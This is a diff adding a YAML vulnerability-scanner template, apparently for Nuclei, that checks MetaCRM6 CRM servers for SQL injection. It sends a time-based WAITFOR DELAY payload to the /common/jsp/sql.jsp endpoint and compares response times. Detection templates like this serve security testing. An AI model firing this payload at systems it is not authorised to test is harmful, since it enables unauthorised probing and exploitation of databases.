@@ -1,0 +1,40 @@
+id: MetaCRM6-sql-sql
+
+info:
+  name: MetaCRM6客户关系管理系统存在SQL注入漏洞
+  author: MetaCRM6
+  severity: high
+  tags: MetaCRM6
+
+http:
+  - raw:
+      - |+
+        GET /common/jsp/sql.jsp?sql= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: */*
+
+      - |+
+        GET /common/jsp/sql.jsp?sql=;WAITFOR%20DELAY%20'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+        Accept: */*
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 10'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - 'SQL ok'
+        condition: and
+
